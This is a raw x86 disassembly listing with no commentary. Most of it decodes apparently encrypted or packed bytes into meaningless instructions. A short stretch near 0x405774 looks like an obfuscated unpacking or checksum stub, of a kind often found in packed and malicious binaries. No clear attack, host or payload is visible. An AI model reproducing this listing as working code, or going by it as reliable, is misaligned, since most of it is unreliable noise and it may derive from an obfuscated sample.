  4051d6:	mov    dh,dl
  4051d8:	mov    edi,0x16473d2
  4051dd:	jg     0x4051a5
  4051df:	sub    al,BYTE PTR [edi-0x21]
  4051e2:	or     al,ch
  4051e4:	lock inc eax
  4051e6:	dec    edx
  4051e7:	push   eax
  4051e8:	add    BYTE PTR [ecx+0x1e],ch
  4051eb:	test   ecx,esi
  4051ed:	mov    ah,0x3e
  4051ef:	cmc    
  4051f0:	mov    dh,BYTE PTR [edx-0xff8e468]
  4051f6:	or     al,0xfc
  4051f8:	add    eax,0x3fd3995f
  4051fd:	data16 (bad) 
  405201:	ins    DWORD PTR es:[edi],dx
  405202:	rcr    BYTE PTR [ebp-0x7c],0x8c
  405206:	loop   0x40518e
  405208:	es es mov ds:0x8ac618ee,eax
  405210:	test   eax,0x6cd7412f
  405215:	mov    edi,0x5a1750df
  40521a:	xchg   edx,eax
  40521b:	jle    0x40528d
  40521d:	rcl    BYTE PTR [ecx+ecx*1-0x35001572],0x49
  405225:	pop    eax
  405226:	dec    esi
  405227:	lahf   
  405228:	repz data16 fist WORD PTR [ecx-0x3259be80]
  405230:	pop    ebp
  405231:	test   al,0x4f
  405233:	adc    dl,cl
  405235:	add    BYTE PTR [esp+ebx*1],dl
  405238:	pop    ecx
  405239:	or     BYTE PTR [eax-0x46190d9],al
  40523f:	or     al,BYTE PTR [esi-0x4905e328]
  405245:	cmp    dh,bh
  405247:	mov    bl,0x18
  405249:	in     al,dx
  40524a:	fdivp  st(1),st
  40524c:	mov    esi,0x455cfe70
  405251:	retf   
  405252:	scas   eax,DWORD PTR es:[edi]
  405253:	push   esi
  405254:	mov    al,0x40
  405256:	arpl   WORD PTR [eax+edx*8+0x27],sp
  40525a:	jecxz  0x405270
  40525c:	mov    dh,0xb3
  40525e:	inc    ebp
  40525f:	(bad)  
  405260:	push   esp
  405261:	data16 hlt 
  405263:	jno    0x405264
  405265:	push   esi
  405266:	inc    ebx
  405267:	or     DWORD PTR [ebx+0x2a3568be],ecx
  40526d:	outs   dx,BYTE PTR ds:[esi]
  40526e:	xchg   bl,dl
  405270:	inc    edx
  405271:	jl     0x405239
  405273:	jne    0x40525d
  405275:	fld    DWORD PTR [eax-0x13]
  405278:	or     al,ah
  40527a:	jnp    0x405226
  40527c:	lods   al,BYTE PTR ds:[esi]
  40527d:	dec    ecx
  40527e:	cmp    DWORD PTR [esi],0xa0833b6d
  405284:	cwde   
  405285:	jmp    0x405262
  405287:	pop    eax
  405288:	mov    edx,0xdcd21b6b
  40528d:	js     0x405308
  40528f:	sub    BYTE PTR [edx],dl
  405291:	inc    ebx
  405292:	repz pop ebx
  405294:	jne    0x40523b
  405296:	pop    esp
  405297:	sahf   
  405298:	inc    edx
  405299:	fs loopne 0x4052fc
  40529c:	mov    dl,0xc
  40529e:	mov    BYTE PTR [edi+edx*2+0x3ff194d9],dh
  4052a5:	pop    ebx
  4052a6:	in     al,0x2b
  4052a8:	jg     0x405323
  4052aa:	jb     0x4052ac
  4052ac:	xchg   esi,ecx
  4052ae:	xchg   edi,eax
  4052af:	or     eax,DWORD PTR [ebx+esi*4]
  4052b2:	and    eax,0x5b2ebccb
  4052b7:	neg    ebp
  4052b9:	sti    
  4052ba:	adc    eax,0x782c99bc
  4052bf:	push   ecx
  4052c0:	clc    
  4052c1:	xchg   ebp,eax
  4052c2:	add    DWORD PTR [ecx-0x22897908],esp
  4052c8:	ret    
  4052c9:	addr16 (bad) 
  4052cb:	jno    0x4052bb
  4052cd:	mov    BYTE PTR [ebp+0x22],bh
  4052d0:	sub    ah,BYTE PTR [ecx+0x2d572dd7]
  4052d6:	jge    0x40530e
  4052d8:	in     eax,dx
  4052d9:	xchg   esp,eax
  4052da:	dec    ebx
  4052db:	int    0x2c
  4052dd:	sbb    ebp,DWORD PTR [ebx-0x5e166748]
  4052e3:	sub    esp,0x9a06edfa
  4052e9:	leave  
  4052ea:	mov    eax,0xf9881c4c
  4052ef:	jns    0x405316
  4052f1:	in     al,dx
  4052f2:	out    0x98,eax
  4052f4:	aaa    
  4052f5:	in     eax,0x58
  4052f7:	jbe    0x4052de
  4052f9:	jae    0x405372
  4052fb:	mov    ah,al
  4052fd:	shr    DWORD PTR [ecx+ebp*2],0xda
  405301:	inc    ebx
  405302:	aaa    
  405303:	retf   0x6070
  405306:	lock iret 
  405308:	addr16 je 0x4052c7
  40530b:	in     al,0xaa
  40530d:	jecxz  0x405299
  40530f:	mov    cl,bl
  405311:	dec    esi
  405312:	sub    dl,BYTE PTR [ebx-0x6728dfa5]
  405318:	daa    
  405319:	mov    edi,esi
  40531b:	and    dh,BYTE PTR [ebx]
  40531d:	stos   BYTE PTR es:[edi],al
  40531e:	fist   WORD PTR [esi+ebp*4+0x3c]
  405322:	and    ecx,DWORD PTR [eax+0x4e79c3fa]
  405328:	sub    BYTE PTR [ecx+0x6a],bh
  40532b:	xchg   al,dh
  40532d:	push   es
  40532e:	ds scas eax,DWORD PTR es:[edi]
  405330:	outs   dx,BYTE PTR ds:[esi]
  405331:	jl     0x405303
  405333:	cmp    ebp,0xfadaefd7
  405339:	push   0x140e59bf
  40533e:	sti    
  40533f:	out    dx,eax
  405340:	and    DWORD PTR [edi-0x2d],ebp
  405343:	push   edx
  405344:	mov    al,ds:0x6c6acbbe
  405349:	retf   
  40534a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534b:	inc    ebp
  40534c:	mov    esp,0x2689db8a
  405351:	inc    ebp
  405352:	sbb    edi,edi
  405354:	clc    
  405355:	aas    
  405356:	push   edi
  405357:	mov    ah,0x59
  405359:	sub    ecx,0x72419d5e
  40535f:	push   es
  405360:	add    ch,dh
  405362:	push   esp
  405363:	sub    dh,cl
  405365:	aaa    
  405366:	pop    ebp
  405367:	mov    ds:0xe0671737,al
  40536c:	test   BYTE PTR [eax],bl
  40536e:	cmc    
  40536f:	inc    edx
  405370:	fdiv   DWORD PTR [eax+0x5844e036]
  405376:	push   cs
  405377:	shl    BYTE PTR [ecx-0x72ec3e65],cl
  40537d:	in     eax,dx
  40537e:	xchg   ebx,eax
  40537f:	cmp    BYTE PTR [edx-0x6a],dh
  405382:	push   es
  405383:	xor    BYTE PTR [ebx-0xf],bl
  405386:	test   al,0xd8
  405388:	shr    BYTE PTR [edi+0x6f],1
  40538b:	lods   eax,DWORD PTR ds:[esi]
  40538c:	int3   
  40538d:	pop    ss
  40538e:	push   0x3f
  405390:	cmc    
  405391:	sbb    al,0xfc
  405393:	lds    eax,FWORD PTR [eax]
  405395:	mov    dl,0x6c
  405397:	mov    al,0xd
  405399:	not    DWORD PTR [ebx+eiz*1+0x32]
  40539d:	not    BYTE PTR [eax+0x3a]
  4053a0:	retf   0xce3e
  4053a3:	mov    eax,0xba26a101
  4053a8:	clc    
  4053a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053aa:	pop    eax
  4053ab:	inc    esi
  4053ac:	outs   dx,BYTE PTR ds:[esi]
  4053ad:	shl    edx,1
  4053af:	dec    eax
  4053b0:	jl     0x4053db
  4053b2:	add    bh,ch
  4053b4:	in     eax,0x4f
  4053b6:	daa    
  4053b7:	xor    DWORD PTR [edx],ebx
  4053b9:	sti    
  4053ba:	or     cl,BYTE PTR [ebp+ebx*8+0x38]
  4053be:	fmul   DWORD PTR [eax]
  4053c0:	adc    eax,0x1b10c932
  4053c5:	loopne 0x40540d
  4053c7:	ss inc edx
  4053c9:	mov    DWORD PTR [esi-0x7b],edi
  4053cc:	mov    ch,0x5e
  4053ce:	sbb    BYTE PTR [eax+0x2c581f08],dh
  4053d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053d5:	fcom   QWORD PTR [ebx+edx*8-0x7c62d542]
  4053dc:	inc    ebp
  4053dd:	jno    0x405377
  4053df:	and    eax,0xb1b23edd
  4053e4:	pusha  
  4053e5:	cmp    dh,dl
  4053e7:	stc    
  4053e8:	jmp    0x4053bd
  4053ea:	mov    ecx,0x6c0990a5
  4053ef:	shl    ch,1
  4053f1:	(bad)  
  4053f2:	mov    edi,0x853b19f
  4053f7:	ins    BYTE PTR es:[edi],dx
  4053f8:	add    edx,DWORD PTR [edi+0x5614222c]
  4053fe:	in     al,dx
  4053ff:	xchg   cl,al
  405401:	xor    BYTE PTR [edi],dh
  405403:	jmp    0x8b32cd76
  405408:	gs push ebp
  40540a:	jb     0x4053c1
  40540c:	xor    DWORD PTR [edi-0x2610bc5c],edx
  405412:	push   esi
  405413:	idiv   BYTE PTR [esi+0x44]
  405416:	arpl   sp,cx
  405418:	ror    DWORD PTR [esi-0x7e],cl
  40541b:	and    BYTE PTR [ecx+ecx*8],0xe1
  40541f:	adc    ebp,DWORD PTR [edi+ecx*4]
  405422:	call   0x3fd9:0xb4b7327d
  405429:	mul    DWORD PTR [eax]
  40542b:	ss xor al,0x6d
  40542e:	mov    bl,0x7
  405430:	aas    
  405431:	test   BYTE PTR ds:0xd926a83a,ah
  405437:	adc    al,0xf3
  405439:	int3   
  40543a:	push   eax
  40543b:	push   esi
  40543c:	gs xchg esi,eax
  40543e:	stos   DWORD PTR es:[edi],eax
  40543f:	(bad)  
  405440:	xchg   edx,eax
  405441:	cmp    al,0x30
  405443:	sbb    BYTE PTR [edi],al
  405445:	adc    eax,0x4f9ac7ff
  40544a:	xchg   BYTE PTR [ebx+0x10],ah
  40544d:	jmp    0x4054c0
  40544f:	loope  0x4053e3
  405451:	push   edx
  405452:	lods   al,BYTE PTR es:[esi]
  405454:	inc    ebx
  405455:	cmp    bl,ah
  405457:	stos   DWORD PTR es:[edi],eax
  405458:	retf   
  405459:	mov    esi,0x77461283
  40545e:	push   ecx
  40545f:	repz or BYTE PTR ss:[edx-0x79f005c5],dh
  405467:	push   ebp
  405468:	idiv   bh
  40546a:	dec    DWORD PTR [ebx+0x7d8bf455]
  405470:	fsub   st(1),st
  405472:	inc    BYTE PTR [edx]
  405474:	add    BYTE PTR [eax],al
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x78b3fbb8]
  405484:	xchg   ebx,eax
  405485:	or     edx,eax
  405487:	sub    edi,DWORD PTR [esi+0x7e]
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x40545e
  40548f:	push   0x4918ffa4
  405494:	(bad)  
  405495:	shl    al,0x60
  405498:	push   ds
  405499:	and    ebp,DWORD PTR [edi-0x7ba98f41]
  40549f:	adc    eax,0x8b870f53
  4054a4:	inc    ecx
  4054a5:	xchg   esp,eax
  4054a6:	mov    bh,0xe2
  4054a8:	enter  0xcc58,0xd9
  4054ac:	mov    eax,DWORD PTR [esi-0x108c2aee]
  4054b2:	xchg   ebp,eax
  4054b3:	repnz cmp al,0xc0
  4054b6:	push   edx
  4054b7:	or     DWORD PTR [esi],ecx
  4054b9:	nop
  4054ba:	cmp    dh,BYTE PTR [ecx]
  4054bc:	faddp  st(1),st
  4054be:	cmp    al,0x48
  4054c0:	stos   BYTE PTR es:[edi],al
  4054c1:	mov    bh,0xb6
  4054c3:	pop    ss
  4054c4:	cld    
  4054c5:	jbe    0x405509
  4054c7:	add    eax,0xf55447e3
  4054cc:	out    0xea,al
  4054ce:	sub    DWORD PTR [ebp+0x0],esp
  4054d1:	data16 sub al,BYTE PTR [esi+ebx*1]
  4054d5:	in     eax,0x48
  4054d7:	xchg   esp,eax
  4054d8:	(bad)  
  4054d9:	jae    0x40545e
  4054db:	icebp  
  4054dc:	sub    bl,dl
  4054de:	hlt    
  4054df:	xor    eax,0x491f0022
  4054e4:	inc    eax
  4054e5:	call   0x1a4a27fb
  4054ea:	fcmovnbe st,st(0)
  4054ec:	repz jge 0x4054c0
  4054ef:	push   ebx
  4054f0:	in     al,dx
  4054f1:	mov    ebx,0xac6551d8
  4054f6:	cmc    
  4054f7:	and    eax,0x7028d2b0
  4054fc:	mov    al,ds:0x3c1e7c04
  405501:	push   ebx
  405502:	stos   BYTE PTR es:[edi],al
  405503:	and    esi,DWORD PTR [edx+0x35]
  405506:	mov    ebx,ds
  405508:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405509:	les    edi,FWORD PTR [ecx]
  40550b:	bound  ebp,QWORD PTR [edx-0x5e]
  40550e:	add    cl,cl
  405510:	jns    0x405530
  405512:	out    dx,al
  405513:	jl     0x405564
  405515:	push   ebp
  405516:	(bad)  
  405517:	in     al,dx
  405518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405519:	push   ds
  40551a:	pop    edx
  40551b:	adc    edi,eax
  40551d:	xchg   edi,eax
  40551e:	and    dh,BYTE PTR [ebx+0x33]
  405521:	add    DWORD PTR [edi+0x0],0x5f
  405525:	loop   0x405585
  405527:	cmp    eax,0xc4d7931e
  40552c:	mov    edx,0x27c2701e
  405531:	xor    al,0xfc
  405533:	test   al,0xc5
  405535:	jg     0x405509
  405537:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405538:	inc    eax
  405539:	stc    
  40553a:	sbb    BYTE PTR [ecx+ebp*8-0x4e0861e6],bh
  405541:	aad    0xfd
  405543:	mov    dh,0x83
  405545:	jnp    0x405596
  405547:	push   eax
  405548:	push   ebx
  405549:	xor    cl,BYTE PTR [edx+eax*1+0xf]
  40554d:	addr16 into 
  40554f:	xchg   edi,eax
  405550:	retf   
  405551:	push   ecx
  405552:	jecxz  0x40550f
  405554:	ins    BYTE PTR es:[edi],dx
  405555:	aas    
  405556:	scas   al,BYTE PTR es:[edi]
  405557:	into   
  405558:	hlt    
  405559:	rcl    BYTE PTR [ebx],1
  40555b:	cmc    
  40555c:	mov    bl,0xca
  40555e:	ss loop 0x4054f1
  405561:	inc    eax
  405562:	repz add ah,BYTE PTR [esi+0x63]
  405566:	xlat   BYTE PTR ds:[ebx]
  405567:	xchg   ecx,eax
  405568:	cmp    eax,0xed2e6dd4
  40556d:	mov    edx,ebx
  40556f:	ret    0x71d8
  405572:	mov    WORD PTR [eax-0x57],?
  405575:	xchg   ecx,eax
  405576:	pop    ecx
  405577:	mov    eax,ds:0x1f717e1e
  40557c:	xor    al,BYTE PTR [ebx+0x1f]
  40557f:	cmp    DWORD PTR [ecx],edx
  405581:	xor    DWORD PTR [ecx+0x194d2ea9],edx
  405587:	js     0x40553c
  405589:	test   ch,dl
  40558b:	push   0xffffffff
  40558d:	(bad)  
  40558e:	in     eax,dx
  40558f:	ja     0x405582
  405591:	mov    ebx,0xe4b81bdb
  405596:	add    ebx,DWORD PTR [esi-0x79]
  405599:	adc    eax,0x527aefcf
  40559e:	push   ss
  40559f:	add    eax,0x38ccce54
  4055a4:	push   es
  4055a5:	jl     0x405612
  4055a7:	mov    BYTE PTR gs:[eax+0x40b5fb38],0xfb
  4055af:	add    eax,eax
  4055b1:	cmp    eax,0x50531ba2
  4055b6:	sar    ecx,1
  4055b8:	xchg   edi,eax
  4055b9:	xor    ebx,DWORD PTR [eax-0x1fe2f32]
  4055bf:	pop    ebp
  4055c0:	lock cmp ah,BYTE PTR [eax+0x34a4e29f]
  4055c7:	sbb    DWORD PTR [ecx-0x3e],ecx
  4055ca:	js     0x405574
  4055cc:	bound  esi,QWORD PTR [edi]
  4055ce:	xor    edx,DWORD PTR [ebp+edx*1+0x62]
  4055d2:	ins    DWORD PTR es:[edi],dx
  4055d3:	dec    eax
  4055d4:	sbb    ebp,DWORD PTR [edi]
  4055d6:	hlt    
  4055d7:	push   ebx
  4055d8:	(bad)  
  4055da:	nop
  4055db:	lods   eax,DWORD PTR ds:[esi]
  4055dc:	mov    WORD PTR ds:[ebp+0x68f2d7ce],es
  4055e3:	mov    edi,0x8eda221a
  4055e8:	mov    ch,0x65
  4055ea:	je     0x405666
  4055ec:	and    ebx,DWORD PTR [esi]
  4055ee:	iret   
  4055ef:	out    0x97,eax
  4055f1:	xlat   BYTE PTR ds:[ebx]
  4055f2:	popf   
  4055f3:	inc    esp
  4055f4:	mov    cl,0x8b
  4055f6:	cmp    eax,0x62d0b7f8
  4055fb:	sbb    ah,dh
  4055fd:	mov    ecx,0xb51c0ce8
  405602:	icebp  
  405603:	inc    eax
  405604:	or     eax,0x587d3b6a
  405609:	cmp    eax,0xe24bfd9e
  40560e:	push   eax
  40560f:	hlt    
  405610:	xchg   esi,eax
  405611:	repnz shl esp,1
  405614:	test   al,0x63
  405616:	mov    ds:0x8c2f7c6,eax
  40561b:	imul   eax,DWORD PTR [ecx+0x27d26db2],0xffffffca
  405622:	loopne 0x4055ed
  405624:	in     eax,dx
  405625:	aaa    
  405626:	sbb    eax,0x610f149
  40562b:	in     al,dx
  40562c:	mov    ds:0xad6a4dc6,al
  405631:	ja     0x40566a
  405633:	xor    al,0xa2
  405635:	out    0x4b,al
  405637:	scas   al,BYTE PTR es:[edi]
  405638:	out    dx,eax
  405639:	stc    
  40563a:	jp     0x4056ac
  40563c:	fbstp  TBYTE PTR [ecx]
  40563e:	stc    
  40563f:	iret   
  405640:	mov    esi,0x812ac9e
  405645:	ficomp WORD PTR [edx-0x1b5090e4]
  40564b:	call   0xf785:0xc3faa3c1
  405652:	fdivr  QWORD PTR [ecx+0x617ae131]
  405658:	mov    eax,0x8626e18d
  40565d:	pop    esp
  40565e:	dec    BYTE PTR [eax-0x2b]
  405661:	pop    eax
  405662:	or     ebp,esi
  405664:	inc    ecx
  405665:	mov    dh,0xc6
  405667:	imul   BYTE PTR ds:0x28ab7ab1
  40566d:	shl    DWORD PTR [ecx],1
  40566f:	push   eax
  405670:	mov    al,ds:0xaf4d6c84
  405675:	push   0xe9ca6c3a
  40567a:	(bad)  
  40567b:	xor    BYTE PTR [esi-0x19],bh
  40567e:	cmp    al,0x81
  405680:	xor    ah,BYTE PTR cs:[ecx]
  405683:	sbb    BYTE PTR [edi-0x18c83019],0x9
  40568a:	lock bound ebp,QWORD PTR [edx]
  40568d:	push   0xcfaaa894
  405692:	lahf   
  405693:	jmp    0x3627:0x57c77653
  40569a:	stos   BYTE PTR es:[edi],al
  40569b:	mov    esp,0xbc4a78d8
  4056a0:	fmul   st(3),st
  4056a2:	ret    0x44b
  4056a5:	dec    ebp
  4056a6:	icebp  
  4056a7:	ins    BYTE PTR es:[edi],dx
  4056a8:	test   DWORD PTR [eax-0x40],ebp
  4056ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056ac:	aad    0xc
  4056ae:	add    ebp,DWORD PTR [edi]
  4056b0:	aad    0xa5
  4056b2:	popa   
  4056b3:	mov    cl,0x86
  4056b5:	fisub  WORD PTR [edi-0x4]
  4056b8:	sub    BYTE PTR [ebx],ah
  4056ba:	mov    cl,0xf0
  4056bc:	push   es
  4056bd:	iret   
  4056be:	cld    
  4056bf:	sahf   
  4056c0:	pop    esp
  4056c1:	sbb    al,0xdd
  4056c3:	push   eax
  4056c4:	popa   
  4056c5:	mov    dl,0xdd
  4056c7:	adc    eax,0x76aa001b
  4056cc:	pusha  
  4056cd:	sar    dl,0x68
  4056d0:	push   es
  4056d1:	pop    edi
  4056d2:	jno    0x405708
  4056d4:	call   0x64e4c71a
  4056d9:	push   eax
  4056da:	cdq    
  4056db:	into   
  4056dc:	imul   ecx,ecx,0x52
  4056df:	sub    al,0xd6
  4056e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056e2:	xor    BYTE PTR [edx+0xb],dl
  4056e5:	clc    
  4056e6:	dec    ecx
  4056e7:	iret   
  4056e8:	das    
  4056e9:	(bad)  
  4056ea:	mov    ds:0x308722ae,eax
  4056ef:	push   edx
  4056f0:	stos   BYTE PTR es:[edi],al
  4056f1:	push   esi
  4056f2:	(bad)  
  4056f3:	pop    esi
  4056f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f5:	rcl    BYTE PTR [eax-0x66],cl
  4056f8:	pop    esp
  4056f9:	mov    ebx,esp
  4056fb:	sub    esp,DWORD PTR [ebx-0x7e]
  4056fe:	lods   al,BYTE PTR ds:[esi]
  4056ff:	jmp    0x62978ab3
  405704:	neg    BYTE PTR [ebx]
  405706:	shl    eax,0x64
  405709:	push   edi
  40570a:	push   esp
  40570b:	push   ebx
  40570c:	mov    eax,ds:0x6a757601
  405711:	retf   
  405712:	mov    WORD PTR [esi+ebx*2],ds
  405715:	fnstcw WORD PTR [edi+0x39]
  405718:	push   ss
  405719:	sbb    al,0x9
  40571b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40571d:	stc    
  40571e:	cmp    bl,BYTE PTR [ebp-0x2]
  405721:	int3   
  405722:	cmp    al,0xc7
  405724:	loopne 0x40578e
  405726:	jb     0x4056ac
  405728:	(bad)  [eax+0x22]
  40572b:	pop    es
  40572c:	add    eax,DWORD PTR ss:[ebp+0x2]
  405730:	and    al,BYTE PTR [ebx]
  405732:	out    dx,eax
  405733:	xchg   esp,eax
  405734:	inc    esp
  405735:	jge    0x40576f
  405737:	xchg   DWORD PTR [ebp+0x69],ecx
  40573a:	sti    
  40573b:	enter  0xa89,0xf1
  40573f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405740:	shr    DWORD PTR [ecx+ebx*1-0x779efa5c],0xaa
  405748:	test   DWORD PTR [ebx],ebx
  40574a:	xor    edi,DWORD PTR [edi]
  40574c:	mov    bh,0xad
  40574e:	xlat   BYTE PTR ds:[ebx]
  40574f:	xchg   ebx,eax
  405750:	jmp    0x405754
  405752:	push   ebp
  405753:	inc    edi
  405754:	pop    eax
  405755:	int    0x35
  405757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405758:	dec    ebx
  405759:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40575a:	xor    DWORD PTR [esi-0x3a],eax
  40575d:	inc    esp
  40575e:	nop
  40575f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405760:	(bad)  
  405762:	sub    cl,BYTE PTR [edi]
  405764:	pop    eax
  405765:	pop    ds
  405766:	lea    eax,[ecx]
  405768:	mov    edi,0x954cf4f4
  40576d:	jmp    0x899b:0x5030a67
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43381b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433723,0x433703
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43375f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0xf9
  4057f5:	aam    0xf6
  4057f7:	dec    edx
  4057f8:	cmp    dh,BYTE PTR [esi]
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	loopne 0x40580a
  405802:	push   0xffffffaa
  405804:	and    eax,0xd5e6de6c
  405809:	(bad)  
  40580b:	jbe    0x4057d8
  40580d:	ss cwde 
  40580f:	adc    al,0x75
  405811:	xchg   edx,eax
  405812:	pop    ecx
  405813:	aas    
  405814:	sti    
  405815:	cs xchg edx,eax
  405817:	adc    DWORD PTR [ecx],esp
  405819:	pop    ebp
  40581a:	shl    DWORD PTR [ecx],0xac
  40581d:	jecxz  0x40587b
  40581f:	push   0x5
  405821:	add    al,0xe2
  405823:	cwde   
  405824:	ret    0x35a2
  405827:	jbe    0x4057b5
  405829:	push   ecx
  40582a:	push   es
  40582b:	jp     0x4057bd
  40582d:	pusha  
  40582e:	fisttp WORD PTR [ecx-0x7c]
  405831:	mov    al,ds:0xbc2dde09
  405836:	mov    ebp,0x641ced97
  40583b:	cmp    al,0x41
  40583d:	push   0x54
  40583f:	lds    esi,FWORD PTR [eax]
  405841:	fxch   st(5)
  405843:	repnz int3 
  405845:	xor    DWORD PTR [ecx],ebp
  405847:	jmp    0x405885
  405849:	rol    DWORD PTR [edi+ebx*8-0x2f92e440],cl
  405850:	imul   DWORD PTR [eax-0x20b0ce62]
  405856:	push   esp
  405857:	xchg   esp,eax
  405858:	sbb    al,0x80
  40585a:	adc    eax,DWORD PTR [esi]
  40585c:	hlt    
  40585d:	dec    esp
  40585e:	cld    
  40585f:	pop    edx
  405860:	or     ebx,DWORD PTR [ebx+ecx*8]
  405863:	stc    
  405864:	mov    esi,edx
  405866:	mov    BYTE PTR [ebx-0x759327c7],dh
  40586c:	add    DWORD PTR [ecx+0x784e93d8],edi
  405872:	aaa    
  405873:	es mov esi,0x6f8add6
  405879:	inc    esp
  40587a:	ror    DWORD PTR [edi+0x9357256],1
  405880:	scas   al,BYTE PTR es:[edi]
  405881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405882:	int3   
  405883:	mov    ebx,0x50bd75b
  405888:	data16 fxch st(7)
  40588b:	aaa    
  40588c:	cmp    bl,ch
  40588e:	gs stc 
  405890:	and    esp,DWORD PTR [ebx]
  405892:	sub    al,0x3
  405894:	arpl   WORD PTR [edx],di
  405896:	xor    bh,BYTE PTR [ebp+edi*1-0x2aa879f9]
  40589d:	mov    esi,0x89f92014
  4058a2:	dec    ecx
  4058a3:	pop    edi
  4058a4:	rcl    DWORD PTR [ebp+0x6ce5d20],cl
  4058aa:	and    DWORD PTR [ebp-0x6e2efe65],eax
  4058b0:	inc    ecx
  4058b1:	mov    ah,0xa0
  4058b3:	jo     0x4058d0
  4058b5:	dec    eax
  4058b6:	loope  0x4058a9
  4058b8:	xchg   esp,eax
  4058b9:	lahf   
  4058ba:	pop    ds
  4058bb:	mul    DWORD PTR [ecx]
  4058bd:	xor    esp,DWORD PTR [edi+0x39b22725]
  4058c3:	adc    eax,ebp
  4058c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058c6:	sbb    esi,ecx
  4058c8:	push   ss
  4058c9:	frstor [ecx]
  4058cb:	fwait
  4058cc:	push   ds
  4058cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058ce:	mov    ebp,0x627ebaa4
  4058d3:	pop    ebp
  4058d4:	cs adc al,ch
  4058d7:	add    BYTE PTR [eax+0x3e],0xe6
  4058db:	(bad)  
  4058dc:	and    DWORD PTR [eax-0x5393211f],esi
  4058e2:	std    
  4058e3:	bound  esp,QWORD PTR [esi+0x8]
  4058e6:	mov    ch,0xae
  4058e8:	or     DWORD PTR [edx-0x1d3ce529],eax
  4058ee:	pop    ds
  4058ef:	lods   al,BYTE PTR ds:[esi]
  4058f0:	mov    esp,0xf8d4bf9
  4058f5:	mov    al,0xef
  4058f7:	pusha  
  4058f8:	mov    esi,0x3d236d3
  4058fd:	push   ds
  4058fe:	cs out dx,al
  405900:	and    al,0xc5
  405902:	std    
  405903:	test   DWORD PTR [edx],ebx
  405905:	jge    0x40591e
  405907:	mov    dh,0x9a
  405909:	cmp    ah,BYTE PTR [ecx+0x77e1ba6e]
  40590f:	push   edx
  405910:	pop    ebx
  405911:	dec    ecx
  405912:	or     al,0x29
  405914:	jle    0x40591d
  405916:	sar    bl,1
  405918:	icebp  
  405919:	jmp    0xecac:0xd81839d
  405920:	in     eax,0xe9
  405922:	scas   eax,DWORD PTR es:[edi]
  405923:	das    
  405924:	pop    ds
  405925:	mul    DWORD PTR [ecx+ebp*4]
  405928:	jl     0x405946
  40592a:	push   cs
  40592b:	pop    ecx
  40592c:	shl    DWORD PTR [edx],1
  40592e:	leave  
  40592f:	ds push edx
  405931:	mov    ebx,0xedafebbd
  405936:	into   
  405937:	test   DWORD PTR [edi],eax
  405939:	mov    bh,0xe8
  40593b:	mov    esi,0x2e9aa983
  405940:	push   ds
  405941:	test   DWORD PTR [edi+0x79217ef3],0x999425b6
  40594b:	pop    ds
  40594c:	stc    
  40594d:	mov    DWORD PTR [ebx+esi*4-0x67],ebp
  405951:	les    edx,FWORD PTR [eax]
  405953:	sub    eax,0xd4d46fc6
  405958:	inc    ebx
  405959:	(bad)  
  40595a:	(bad)  
  40595c:	pop    ebx
  40595d:	test   DWORD PTR [eax+ebp*4+0x2e6fe4ac],0xcd05f447
  405968:	inc    edi
  405969:	into   
  40596a:	ror    BYTE PTR ds:0x6389cd94,cl
  405970:	cmc    
  405971:	mov    eax,ds:0x3da5dfcd
  405976:	inc    esi
  405977:	cmp    dl,bh
  405979:	dec    ebp
  40597a:	data16 jns 0x40594f
  40597d:	rcl    BYTE PTR [ecx+0x8617e92],0xc
  405984:	daa    
  405985:	push   ebp
  405986:	jmp    0x3215:0xffbbafce
  40598d:	dec    edi
